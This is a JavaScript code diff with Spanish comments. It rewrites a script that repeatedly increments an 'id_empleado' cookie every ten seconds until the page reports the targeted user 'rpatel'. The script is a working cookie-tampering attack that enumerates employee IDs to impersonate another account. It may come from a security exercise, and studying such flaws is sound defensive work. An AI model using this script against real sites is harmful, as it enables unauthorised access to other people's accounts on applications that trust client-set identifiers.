@@ -4,7 +4,7 @@ function encuentraUsuario(){
   return usuario;
 }
 
-function aumentarCookieYRecargar() {
+function aumentarCookie() {
   // Obtener el valor actual de la cookie 'id_empleado'
   var valorCookie = parseInt(document.cookie.replace(/(?:(?:^|.*;\s*)id_empleado\s*\=\s*([^;]*).*$)|^.*$/, "$1")) || 0;
 
@@ -14,12 +14,31 @@ function aumentarCookieYRecargar() {
   // Establecer la nueva cookie con el valor aumentado
   document.cookie = 'id_empleado=' + valorCookie;
 
-  // Recargar la página actual
-  location.reload();
 }
 
-// Iniciar el bucle que se ejecutará cada 10 segundos
-setInterval(aumentarCookieYRecargar, 10000);
-  //cheerio
+// Función que busca un usuario en la cookie
+function bucleCooky(usuarioObjetivo) {
+  let usrActual = encuentraUsuario(); // Obtiene el usuario actual
 
-  
+  if (usrActual === usuarioObjetivo) {
+    // Si el usuario actual es el usuario objetivo, muestra un mensaje y detiene el cambio de usuario
+    console.log("¡Usuario encontrado!");
+    return;
+  }
+
+  const intervalId = setInterval(() => {
+    aumentarCookie(); // Modifica la cookie con la que se hace la petición PHP
+    username()
+    usrActual = encuentraUsuario(); // Actualiza el usuario actual
+
+    if (usrActual === usuarioObjetivo) {
+      // Si se encuentra el usuario objetivo, muestra un mensaje y detiene el cambio de usuario
+      alert("¡Usuario encontrado!");
+      clearInterval(intervalId); // Detiene el intervalo
+    }
+  }, 10000);
+}
+
+bucleCooky("rpatel"); // Llama a la función con el usuario a buscar
+
+
